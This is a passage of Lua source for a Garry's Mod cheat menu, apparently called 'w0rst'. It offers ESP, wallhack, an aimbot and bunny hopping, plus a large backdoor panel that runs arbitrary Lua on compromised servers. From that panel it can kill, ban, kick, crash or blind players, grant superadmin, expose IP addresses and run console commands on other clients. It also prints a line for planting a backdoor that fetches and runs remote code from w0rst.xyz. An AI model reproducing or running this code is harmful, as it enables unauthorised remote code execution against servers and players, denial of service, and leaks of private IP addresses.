                    draw.SimpleText(v:Nick(),"Default",position.x,position.y,Color(name_color.r, name_color.g, name_color.b),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
                end

                if weapon_enable then
                    if Ent:GetActiveWeapon():IsValid() then
                        local weapon_name=Ent:GetActiveWeapon():GetPrintName()
                        local Position = (v:GetPos() + Vector(0,0,-15)):ToScreen()
                        draw.SimpleText(weapon_name,"Default",Position.x,Position.y,Color(weapon_color.r, weapon_color.g, weapon_color.b),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
                    end
                end

                if box_2d_enable then
                    local min, max = v:GetCollisionBounds()
                    local pos = v:GetPos()
                    local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
                    local middle = bottom.y - top.y
                    local width = middle / 2.425
                    surface.SetDrawColor(Color(box_2d_color.r, box_2d_color.g, box_2d_color.b))
                    surface.DrawOutlinedRect(bottom.x - width, top.y, width * 1.85, middle)
                end

                if skeleton_enable then
                    local Success = true
                    local Bones = {}

                    for k, v in pairs(wtf.Bones) do
                        if Ent:LookupBone(v) ~= nil and Ent:GetBonePosition(Ent:LookupBone(v)) ~= nil then
                            table.insert(Bones, Ent:GetBonePosition(Ent:LookupBone(v)):ToScreen())
                        else Success=false; return end
                    end

                    if Success then
                        surface.SetDrawColor(Color(skeleton_color.r, skeleton_color.g, skeleton_color.b))
                        surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
                        surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y); surface.DrawLine(Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y)
                        surface.DrawLine(Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y); surface.DrawLine(Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y)
                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y); surface.DrawLine(Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y)
                        surface.DrawLine(Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y); surface.DrawLine(Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y)
                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y); surface.DrawLine(Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y)
                        surface.DrawLine(Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y); surface.DrawLine(Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y)
                        surface.DrawLine(Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y); surface.DrawLine(Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y)
                    end
                end

                if box_3d_enable then
                    local MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8 = GetEntityPos(Ent)
                    surface.SetDrawColor(Color(box_3d_color.r, box_3d_color.g, box_3d_color.b))
                    surface.DrawLine( V4.x, V4.y, V6.x, V6.y); surface.DrawLine( V1.x, V1.y, V8.x, V8.y)
                    surface.DrawLine( V6.x, V6.y, V8.x, V8.y); surface.DrawLine( V4.x, V4.y, V1.x, V1.y)
                    surface.DrawLine( V3.x, V3.y, V5.x, V5.y); surface.DrawLine( V2.x, V2.y, V7.x, V7.y)
                    surface.DrawLine( V3.x, V3.y, V2.x, V2.y); surface.DrawLine( V5.x, V5.y, V7.x, V7.y)
                    surface.DrawLine( V3.x, V3.y, V4.x, V4.y); surface.DrawLine( V2.x, V2.y, V1.x, V1.y)
                    surface.DrawLine( V7.x, V7.y, V8.x, V8.y); surface.DrawLine( V5.x, V5.y, V6.x, V6.y)
                end

                if wallhack_enable then
                    cam.Start3D()
                        v:DrawModel()
                    cam.End3D()
                end

                if chams_enable then
                    local entitym = FindMetaTable("Entity")
                    local weapon = Ent:GetActiveWeapon()

      			         cam.Start3D()
      				           cam.IgnoreZ(true)
      				           entitym.DrawModel(v)
      				           cam.IgnoreZ(false)
      			         cam.End3D()

          			  if weapon:IsValid() then
          				  cam.Start3D()
          				  	render.MaterialOverride(chams01)
          				  	render.SetColorModulation(chams_color.r/255, chams_color.g/255, chams_color.b/255, 255)
    					             entitym.DrawModel(weapon)
          				  	render.SetColorModulation(chams_color.r/170, chams_color.g/170, chams_color.b/170, 255)
          				  	render.MaterialOverride(chams02)
          					       entitym.DrawModel(weapon)
          				  cam.End3D()

          				  cam.Start3D()
          				  	render.MaterialOverride(chams01)
          				  	render.SetColorModulation(chams_color.b / 255, chams_color.r / 255, chams_color.g / 255)
          					       entitym.DrawModel(v)
          				  	render.SetColorModulation(chams_color.r / 255, chams_color.g / 255, chams_color.b / 255)
          				  	render.MaterialOverride(chams02)
          					       entitym.DrawModel(v)
          				  	render.SetColorModulation(1, 1, 1)
          				  cam.End3D()
            		end
            end
         end
    end
end)

hook.Add("Think", rgb_physgun_hook, function()
    if rgb_physgun_enable then
        local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
	    LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
    end
end)

function wtf.bhop_loop(ply)
	if(ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
        ply:RemoveKey(IN_JUMP);
        if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
            if(ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400);
            else
                ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
                ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400);
            end
        end
    elseif(ply:KeyDown(IN_JUMP)) then
        ply:SetForwardMove(10000)
    end
end

hook.Add("Think", key_hook, function()
    if input.IsKeyDown(KEY_INSERT) and not menu:IsVisible() and not iskeydown then
        iskeydown=true
        menu:Show()
    elseif input.IsKeyDown(KEY_INSERT) and menu:IsVisible() and not iskeydown then
        iskeydown=true
        menu:Hide()
    elseif not input.IsKeyDown(KEY_INSERT) then
        iskeydown=false
    end
end)

--/ aimbot functions

local util = util;
local player = player;
local input = input;
local bit = bit;
local hook = hook;
local me = LocalPlayer();
local aimtarget;
local KEY_LALT = KEY_LALT;
local MASK_SHOT = MASK_SHOT;

local function GetPos(v)
    local eyes = v:LookupAttachment("eyes");
    return(eyes and v:GetAttachment(eyes).Pos or v:LocalToWorld(v:OBBCenter()));
end

local function Valid(v)
    if(not v or  not v:IsValid() or v:Health() < 1 or v:IsDormant() or v == me) then return false; end
    local trace = {
        mask = MASK_SHOT,
        endpos = GetPos(v),
        start = me:EyePos(),
        filter = {me, v},
    };

    return(util.TraceLine(trace).Fraction == 1);
end

local function GetTarget()
    if (Valid(aimtarget)) then return; end
    aimtarget = nil;
    local allplys = player.GetAll();
    for i = 1, #allplys do
        local v = allplys[i];
        if (not Valid(v)) then continue; end
        aimtarget = v;
        return;
    end
end

hook.Add("CreateMove", aimbot_hook, function(pCmd)
    GetTarget();
    if (input.IsKeyDown(KEY_LALT) and aimtarget) then
        if (aimbot_enable == true) then
            local pos = (GetPos(aimtarget) - me:EyePos()):Angle();
            pCmd:SetViewAngles(pos);
            if(autoshoot_enable == true) then
                pCmd:SetButtons(bit.bor(pCmd:GetButtons(), 1))
            end
        end
    end
end)

function refresh_entlist()
    entonlist:Clear(); entofflist:Clear()
    for k, v in pairs(entity_list) do
        entonlist:AddLine(v)
    end

    for k, v in pairs(ents.GetAll()) do
        local name = v:GetClass()
        local copy = false
        if name ~= "player" then
            if not table.HasValue( entity_list, name ) then
                for k, v in pairs (entofflist:GetLines() ) do
                    if v:GetValue(1) == name then copy = true end
                end
                if copy == false then entofflist:AddLine(name) end
            end
        end
    end
end; refresh_entlist()

create_button("Refresh Ents", tab_visuals, 80, 25, 23, 130, function()
    refresh_entlist()
end)

create_button("Add Ent", tab_visuals, 80, 25, 108, 130, function()
  if entofflist:GetSelectedLine() ~= nil then
      table.insert( entity_list, entofflist:GetLine(entofflist:GetSelectedLine()):GetValue(1) )
  end; refresh_entlist()
end)

create_button("Remove Ent", tab_visuals, 80, 25, 193, 130, function()
    if entonlist:GetSelectedLine() ~= nil then
        for k, v in pairs( entity_list ) do
            if v == entonlist:GetLine(entonlist:GetSelectedLine()):GetValue(1) then
                table.remove( entity_list, k )
            end
        end
    end; refresh_entlist()
end)

create_button("Add All", tab_visuals, 80, 25, 278, 130, function()
  for k, v in pairs( entofflist:GetLines() ) do
      table.insert( entity_list, v:GetValue(1) )
  end; refresh_entlist()
end)

create_button("Remove All", tab_visuals, 80, 25, 363, 130, function()
  table.Empty( entity_list )
  refresh_entlist()
end)

create_checkbox("Tracer-ESP", tab_visuals, 16, 10, function()
    tracer_enable=not tracer_enable
    if(tracer_enable == false) then
        wtf.log("Tracer Disabled")
    elseif(tracer_enable == true) then
        wtf.log("Tracer Enabled")
    end
end)

create_checkbox("Distance-ESP", tab_visuals, 126, 10, function()
    distance_enable=not distance_enable
    if(distance_enable == false) then
        wtf.log("Distance Disabled")
    elseif(distance_enable == true) then
        wtf.log("Distance Enabled")
    end
end)

create_checkbox("Name-ESP", tab_visuals, 236, 10, function()
    name_enable=not name_enable
    if(name_enable == false) then
        wtf.log("Name Disabled")
    elseif(name_enable == true) then
        wtf.log("Name Enabled")
    end
end)

create_checkbox("Weapon-ESP", tab_visuals, 346, 10, function()
    weapon_enable=not weapon_enable
    if(weapon_enable == false) then
        wtf.log("Weapon Disabled")
    elseif(weapon_enable == true) then
        wtf.log("Weapon Enabled")
    end
end)

create_checkbox("Box-2D-ESP", tab_visuals, 16, 40, function()
    box_2d_enable=not box_2d_enable
    if(box_2d_enable == false) then
        wtf.log("Box-2D Disabled")
    elseif(box_2d_enable == true) then
        wtf.log("Box-2D Enabled")
    end
end)

create_checkbox("Box-3D-ESP", tab_visuals, 126, 40, function()
    box_3d_enable=not box_3d_enable
    if(box_3d_enable == false) then
        wtf.log("Box-3D Disabled")
    elseif(box_3d_enable == true) then
        wtf.log("Box-3D Enabled")
    end
end)

create_checkbox("Skeleton-ESP", tab_visuals, 236, 40, function()
    skeleton_enable=not skeleton_enable
    if(skeleton_enable == false) then
        wtf.log("Skeleton Disabled")
    elseif(skeleton_enable == true) then
        wtf.log("Skeleton Enabled")
    end
end)

create_checkbox("Chams-ESP", tab_visuals, 346, 40, function()
    chams_enable=not chams_enable
    if(chams_enable == false) then
        wtf.log("Chams Disabled")
    elseif(chams_enable == true) then
        wtf.log("Chams Enabled")
    end
end)

create_checkbox("Entity-ESP", tab_visuals, 16, 70, function()
  entity_enable=not entity_enable
  if(entity_enable == false) then
      wtf.log("Entity Disabled")
  elseif(entity_enable == true) then
      wtf.log("Entity Enabled")
  end
end)

create_checkbox("Wallhack", tab_visuals, 126, 70, function()
    wallhack_enable=not wallhack_enable
    if(wallhack_enable == false) then
        wtf.log("Wallhack Disabled")
    elseif(wallhack_enable == true) then
        wtf.log("Wallhack Enabled")
    end
end)

create_checkbox("Free Camera", tab_visuals, 236, 70, function()
    FC.Enabled=not FC.Enabled
    if FC.Enabled then
        wtf.log("Freecam Enabled")
    else
        wtf.log("Freecam Disabled")
    end
    FC.LockView=FC.Enabled
    FC.SetView=true
end)

create_button("Save Visuals", tab_misc, 100, 25, 355, 170, function()
    local tc = tracer_color.r.." "..tracer_color.g.." "..tracer_color.b
    local dc = distance_color.r.." "..distance_color.g.." "..distance_color.b
    local nc = name_color.r.." "..name_color.g.." "..name_color.b
    local wc = weapon_color.r.." "..weapon_color.g.." "..weapon_color.b
    local bc = box_2d_color.r.." "..box_2d_color.g.." "..box_2d_color.b
    local sc = skeleton_color.r.." "..skeleton_color.g.." "..skeleton_color.b
    local dbc = box_3d_color.r.." "..box_3d_color.g.." "..box_3d_color.b
    local cc = chams_color.r.." "..chams_color.g.." "..chams_color.b
    local ec = entity_color.r.." "..entity_color.g.." "..entity_color.b

    wtf.log("Visuals Saved")
    file.Write("w0rst/visuals.txt", tc..","..dc..","..nc..","..wc..","..bc..","..sc..","..dbc..","..cc..","..ec)
end)

create_button("Load Visuals", tab_misc, 100, 25, 250, 170, function()
    if not file.Exists("w0rst/visuals.txt", "DATA") then
        wtf.log("File Not Found"); wtf.conoutRGB("VISUALS FILE NOT FOUND")
    else
        wtf.log("Visuals Loaded"); wtf.conoutRGB("VISUALS LOADED")
        local f = file.Read("w0rst/visuals.txt")
        local lines = string.Split(f, ",")
        local tc,dc,nc = string.Split(lines[1], " "), string.Split(lines[2], " "), string.Split(lines[3], " ")
        local wc,bc,sc = string.Split(lines[4], " "), string.Split(lines[5], " "), string.Split(lines[6], " ")
        local dbc, cc, ec = string.Split(lines[7], " "), string.Split(lines[8], " "), string.Split(lines[9], " ")

        tracer_slider[1]:SetValue(tc[1]); tracer_slider[2]:SetValue(tc[2]); tracer_slider[3]:SetValue(tc[3])
        distance_slider[1]:SetValue(dc[1]); distance_slider[2]:SetValue(dc[2]); distance_slider[3]:SetValue(dc[3])
        name_slider[1]:SetValue(nc[1]); name_slider[2]:SetValue(nc[2]); name_slider[3]:SetValue(nc[3])
        weapon_slider[1]:SetValue(wc[1]); weapon_slider[2]:SetValue(wc[2]); weapon_slider[3]:SetValue(wc[3])
        box_2d_slider[1]:SetValue(bc[1]); box_2d_slider[2]:SetValue(bc[2]); box_2d_slider[3]:SetValue(bc[3])
        skeleton_slider[1]:SetValue(sc[1]); skeleton_slider[2]:SetValue(sc[2]); skeleton_slider[3]:SetValue(sc[3])
        box_3d_slider[1]:SetValue(dbc[1]); box_3d_slider[2]:SetValue(dbc[2]); box_3d_slider[3]:SetValue(dbc[3])
        chams_slider[1]:SetValue(cc[1]); chams_slider[2]:SetValue(cc[2]); chams_slider[3]:SetValue(cc[3])
        entity_slider[1]:SetValue(ec[1]); entity_slider[2]:SetValue(ec[2]); entity_slider[3]:SetValue(ec[3])
    end
end)

local function check_plr()
    if selected_player ~= "NONE" then
        local plr=selected_player
        return { plr }
    else
        wtf.log("No Player Selected")
    end
end

create_backdoor_server("Kill All", function()
    wtf.sendlua("for k,v in pairs(player.GetAll()) do v:Kill() v:Spawn() end")
    wtf.log("Everyone Killed")
end)

create_backdoor_server("Fling All", function()
    wtf.sendlua("for k,v in pairs(player.GetAll()) do v:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(500,1000))) end")
    wtf.log("Everyone Flung")
end)

create_backdoor_server("Ignite All", function()
    wtf.sendlua("for k,v in pairs(player.GetAll()) do v:Ignite(9999999,9999999) end")
    wtf.log("Everyone Ignited")
end)

create_backdoor_server("Extinguish All", function()
    wtf.sendlua("for k,v in pairs(player.GetAll()) do v:Extinguish() end")
    wtf.log("Everyone Extinguished")
end)

create_backdoor_server("Ban All", function()
     wtf.log("Everyone Banned")
    wtf.sendlua([[
        for k,v in pairs(player.GetAll()) do
            v:Ban(9999999999, false)
            v:Kick()
        end
    ]])
end)

create_backdoor_server("Kick All", function()
     wtf.log("Everyone Kicked")
    wtf.sendlua([[
        for k,v in pairs(player.GetAll()) do
            v:Kick()
        end
    ]])
end)

create_backdoor_server("Retry All", function()
    wtf.log("Everyone Retry'd")
    wtf.sendlua([[
        for k,v in pairs(player.GetAll()) do
            v:ConCommand('retry')
        end
    ]])
end)

create_backdoor_server("Crash All", function()
    wtf.log("Everyone Crashed")
    wtf.sendlua([[
        local id = Player(]]..LocalPlayer():UserID()..[[)
        for k,v in pairs(player.GetAll()) do
            if v:Nick() ~= id:Nick() then
                v:SendLua("function die() return die() end die()")
            end
        end
    ]])
end)

create_backdoor_server("Teleport All",  function()
    wtf.log("Everyone Teleported")
    wtf.sendlua([[
			for k,v in pairs(player.GetAll()) do
				local tps = v:GetEyeTraceNoCursor().HitPos
				v:SetPos(tps)
			end
        ]])
end)

create_backdoor_server("Speed All", function()
    Derma_StringRequest("Set Speed All", "Set Everyones Speed To: ", "", function(str)
        wtf.log("Speed Set: "..str)
        wtf.sendlua([[
            for k,v in pairs(player.GetAll()) do
                v:SetMaxSpeed(]]..str..[[)
                v:SetRunSpeed(]]..str..[[)
            end
        ]])
    end)
end)

create_backdoor_server("Dance All",  function()
    wtf.log("Everyone's Dancing")
    wtf.sendlua([[
        for k,v in pairs(player.GetAll()) do
            v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        end
    ]])
end)

create_backdoor_server("Force Say All", function()
    Derma_StringRequest("Force Everyone To Chat", "Message To Chat:", "",function(str)
        wtf.log("Everyone Just Said: "..str)
        wtf.sendlua([[
            for k,v in pairs(player.GetAll()) do
                v:Say("]]..str..[[")
            end
        ]])
    end)
end)

create_backdoor_server("Encony fucker!!", function()
    wtf.sendlua("for k,v in pairs(player.GetAll()) do v:addMoney(9999999999999) end")
		wtf.log("Eco got raped cuh!!")
end)

create_backdoor_server("Console Say", function()
    Derma_StringRequest("Console Say", "Make Console Say In Chat: ", "", function(str)
        wtf.log("Console Said: "..str)
        wtf.sendlua([[RunConsoleCommand("say",']]..str..[[')]])
    end)
end)

create_backdoor_server("Size All", function()
    Derma_StringRequest("Size Everyone", "Set The Size Of Everyone To:", "", function(str)
        wtf.log("Everyones Size: "..str)
        wtf.sendlua([[
            for k,v in pairs(player.GetAll()) do
                v:SetModelScale(']]..str..[[')
            end
        ]])
    end)
end)

create_backdoor_server("ConCommand All", function()
    Derma_StringRequest("ConCommand All", "Text To Run(eg: retry):", "", function(str)
        wtf.log("Ran Command: "..str)
        wtf.sendlua([[
            for k,v in pairs(player.GetAll()) do
                v:ConCommand(']]..str..[[')
            end
        ]])
    end)
end)

create_backdoor_server("JumpPower All", function()
    Derma_StringRequest("JumpPower All", "JumpPower To Set All:", "", function(str)
        wtf.log("Everyones JumpPower: "..str)
        wtf.sendlua([[
            for k,v in pairs(player.GetAll()) do
                v:SetJumpPower(]]..str..[[)
            end
        ]])
    end)
end)

create_backdoor_server("Break Glass", function()
  wtf.log("Glass Breaking funni!")
		wtf.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
			end
		]])
	end)

create_backdoor_server("God All", function()
    wtf.log("Everyones God")
    wtf.sendlua([[
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
        end
    ]])
end)

create_backdoor_server("UnGod All", function()
    wtf.log("Everyones UnGoded")
    wtf.sendlua([[
        for k,v in pairs(player.GetAll()) do
            v:GodDisable()
        end
    ]])
end)

create_backdoor_server("Stopsound All", function()
    wtf.log("Stopped All Sound")
    wtf.sendlua([[
        for k,v in pairs(player.GetAll()) do
            v:ConCommand('stopsound')
        end
    ]])
end)

create_backdoor_server("Moan All", function()
    wtf.log("Everyone Moaned")
    wtf.sendlua([[
    for k,v in pairs(player.GetAll()) do
        v:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
    end
    ]])
end)

create_backdoor_server("Blind All", function()
    wtf.log("Everyone Blinded")
    wtf.sendlua([[BroadcastLua("hook.Add('HUDPaint','Blindness',function() surface.SetDrawColor(255,255,255,255) surface.DrawRect(0,0,1920,1080) end)")]])
end)

create_backdoor_server("UnBlind All", function()
    wtf.log("Everyone UnBlinded")
    wtf.sendlua([[BroadcastLua("hook.Remove('HUDPaint','Blindness')")]])
end)

create_backdoor_server("Health All", function()
    Derma_StringRequest("Health All", "Health To Set To:", "", function(str)
        wtf.log("Everyones Health Set: "..str)
        wtf.sendlua([[
            for k,v in pairs(player.GetAll()) do
                v:SetHealth(]]..str..[[)
            end
        ]])
    end)
end)

create_backdoor_server("Armor All", function()
    Derma_StringRequest("Armor All", "Armor To Set To:", "", function(str)
        wtf.log("Everyones Armor Set: "..str)
        wtf.sendlua([[
            for k,v in pairs(player.GetAll()) do
                v:SetArmor(]]..str..[[)
            end
        ]])
    end)
end)

create_backdoor_client("Kill", function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Killed: "..Player(plr):Nick())
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:Kill()
            me:Spawn()
        ]])
    end
end)

create_backdoor_client("Fling", function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Flung: "..Player(plr):Nick())
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(50,1000)))
        ]])
    end
end)

create_backdoor_client("Set Speed",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        Derma_StringRequest("Set Speed", "Speed To Set The Player:", "", function(str)
            wtf.log(Player(plr):Nick().." Speed Set")
            wtf.sendlua([[
                local me = Player(]]..plr..[[)
                me:SetMaxSpeed(]]..str..[[)
                me:SetRunSpeed(]]..str..[[)
            ]])
        end)
    end
end)

create_backdoor_client("Give Item",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        Derma_StringRequest("Give Item", "Give Item Named:", "", function(str)
            wtf.log("Item Given To: "..Player(plr):Nick())
            wtf.sendlua([[
                local me = Player(]]..plr..[[)
                me:Give(']]..str..[[')
            ]])
        end)
    end
end)

create_backdoor_client("Crash Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.sendlua([[
            Player(]]..plr..[[):SendLua("function die() return die() end die()")
        ]])
        wtf.log("Player: "..Player(plr):Nick().." Crashed")
    end
end)

create_backdoor_client("Force Say",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        Derma_StringRequest("Force Say", "Force Player To Say:", "", function(str)
            wtf.sendlua([[
                local me = Player(]]..plr..[[)
                me:Say("]]..str..[[")
            ]])
            wtf.log("Player: "..Player(plr):Nick().." Said "..str)
        end)
    end
end)

create_backdoor_client("NoClip Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            if me:GetMoveType() ~= MOVETYPE_NOCLIP then
                me:SetMoveType(MOVETYPE_NOCLIP)
            else
                me:SetMoveType(MOVETYPE_WALK)
            end
        ]])

        if Player(plr):GetMoveType() == MOVETYPE_NOCLIP then
            wtf.log("Noclip Off")
        else
            wtf.log("Noclip On")
        end
    end
end)

create_backdoor_client("Set Usergroup",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        Derma_StringRequest("Set Usergroup", "ex: superadmin", "", function(str)
            wtf.log("Player: "..Player(plr):Nick().." Usergroup: "..str)
            wtf.sendlua([[
                local me = Player(]]..plr..[[)
                me:SetUserGroup("]]..str..[[")
            ]])
        end)
    end
end)

create_backdoor_client("God Enable",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Player: "..Player(plr):Nick().." Godded")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:GodEnable()
        ]])
    end
end)

create_backdoor_client("God Disable",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Player: "..Player(plr):Nick().." UnGodded")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:GodDisable()
        ]])
    end
end)

create_backdoor_client("Ban Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Player"..Player(plr):Nick().." Banned")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:Ban(999999999,false)
            me:Kick()
        ]])
    end
end)

create_backdoor_client("Kick Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Player"..Player(plr):Nick().." Kicked")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:Kick()
        ]])
    end
end)

create_backdoor_client("Retry Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Player "..Player(plr):Nick().." Retry'd")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:ConCommand('retry')
        ]])
    end
end)

create_backdoor_client("Print Ip",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Players IPs Logged")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            local ply = ]]..LocalPlayer():UserID()..[[
            Player(ply):ChatPrint("Player: " .. me:Nick() .. " (" .. me:SteamID() .. ") IP: " .. me:IPAddress())
        ]])
    end
end)

create_backdoor_client("Dance Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Players: "..Player(plr):Nick().." Dancing")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            me:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        ]])
    end
end)

create_backdoor_client("Size Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        Derma_StringRequest("Set Size", "Players Size:", "", function(str)
            wtf.log("Player: "..Player(plr):Nick().." Size:"..str)
            wtf.sendlua([[
                local me = Player(]]..plr..[[)
                me:SetModelScale(']]..str..[[')
            ]])
        end)
    end
end)

create_backdoor_client("ConCommand Player",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        Derma_StringRequest("ConCommand", "String To Run In Console:", "", function(str)
            wtf.log("Ran Command: "..str.." Player: "..Player(plr):Nick())
            wtf.sendlua([[
                local me = Player(]]..plr..[[)
                me:ConCommand(']]..str..[[')
            ]])
        end)
    end
end)

create_backdoor_client("IP Say",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("They Said There Ip")
        wtf.sendlua([[
			local me = Player(]]..plr..[[)
			me:Say("My IP Is: "..me:IPAddress())
        ]])
    end
end)

create_backdoor_client("Drop Weapon",  function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("They Dropped Their Weapon")
        wtf.sendlua([[
            local me = Player(]]..plr..[[)
            if me:GetActiveWeapon() ~= nil then
                me:DropWeapon(me:GetActiveWeapon())
            end
        ]])
    end
end)

create_backdoor_client("Explode Player", function()
    if plr == nil then do wtf.log("No Player Selected") return end else
        wtf.log("Exploded "..Player(plr):Nick())
        wtf.sendlua([[
            local explo = ents.Create("env_explosion")
            local me = Player(]]..plr..[[)

                explo:SetOwner(me)
                explo:SetPos(me:GetPos())
                explo:SetKeyValue("iMagnitude", "250")
                explo:Spawn()
                explo:Activate()
                explo:Fire("Explode", "", 0)

            if me:Alive() then
                me:Kill()
            end
        ]])
    end
end)

create_button("Net-Scan", tab_backdoor, 105, 25, 15, 445, function()
    wtf.check_web_nets()
end)

create_button("Select-Net", tab_backdoor, 105, 25, 125, 445, function()
    Derma_StringRequest("Select Net", "Net To Select:", "", function(str)
        if wtf.check(str) then
            selected_net=str
            wtf.log("Selected Net "..str)
            wtf.conoutRGB("NET SELECTED: "..str)
        else
            wtf.log("Invalid Net")
            wtf.conoutRGB("NET INVALID")
        end
    end)
end)

create_button("Add-Net", tab_backdoor, 105, 25, 235, 445, function()
    Derma_StringRequest("Add Net", "Net To Add:", "", function(str)
        wtf.add_net(str)
        wtf.log("Added Net: "..str); wtf.conoutRGB("ADDED NET: "..str)
    end)
end)

create_button("Run Lua", tab_backdoor, 105, 25, 345, 445, function()
    if(selected_net ~= "NONE") then
        _G.net.Start(selected_net)
        _G.net.WriteString(lua_editor:GetValue())
        _G.net.WriteBit(false)
        _G.net.SendToServer(); wtf.log("Ran Lua - Server")
    else
        wtf.log("No Net Selected")
    end
end)

create_button("Adv-Bhop", tab_misc, 100, 25, 16, 10, function()
    if(bhop_enable == false) then
        wtf.log("Bhop Enabled")
        hook.Add("CreateMove", bhop_hook, function(ply) wtf.bhop_loop(ply) end);
        bhop_enable=true
    else
        wtf.log("Bhop Disabled")
        hook.Remove("CreateMove", bhop_hook)
        bhop_enable=false
    end
end)

create_button("Net-Dumper", tab_misc, 100, 25, 126, 10, function()
    local name = "w0rst/netstrings".."_"..math.random(10^5,10^10)..".txt"
    if file.Exists(name, "DATA") then
        file.Delete(name)
    end

    for i=1,10000 do
        if util.NetworkIDToString(i) then
            if file.Exists(name, "DATA") then
                file.Append(name, "\n"..util.NetworkIDToString(i).." - "..i)
            else
                file.Write(name, GetHostName()..[[ - ]]..game.GetIPAddress().."\n"..util.NetworkIDToString(i).." - "..i)
            end
        end
    end

    wtf.log("Check Console")
    wtf.conoutRGB("NET DUMP LOCATION: C:\\Program Files (x86)\\Steam\\steamapps\\common\\GarrysMod\\garrysmod\\data\\"..name)
end)

create_button("Backdoor-Methods", tab_misc, 100, 25, 236, 10, function()
    MsgC("Web-Method | timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm.php', RunString) end)")
    wtf.log("Check Console")
end)

create_button("Rainbow-Physgun", tab_misc, 100, 25, 346, 10, function()
    if(rgb_physgun_enable == false) then
        wtf.log("RGB-Physgun Enabled")
        rgb_physgun_enable=true
    else
        wtf.log("RGB-Physgun Disabled")
        rgb_physgun_enable=false
    end
end)

create_button("Use-Spammer", tab_misc, 100, 25, 16, 40, function()
    if(use_spam_enable == false) then
        wtf.log("Use Spammer Enabled")
        use_spam_enable=true
        timer.Create(use_timer, 0.1,0, function()
            RunConsoleCommand("+use"); timer.Simple(0.2, function() RunConsoleCommand("-use") end)
        end)
    else
        wtf.log("Use Spammer Disabled")
        timer.Remove(use_timer)
        use_spam_enable=false
    end
end)

create_button("Flash-Spammer", tab_misc, 100, 25, 126, 40, function()
    if(flash_spam_enable == false) then
        wtf.log("Flash Spammer Enabled")
        hook.Add("Tick", flash_spam_hook , function() LocalPlayer():ConCommand("impulse 100") end)
        flash_spam_enable=true
    else
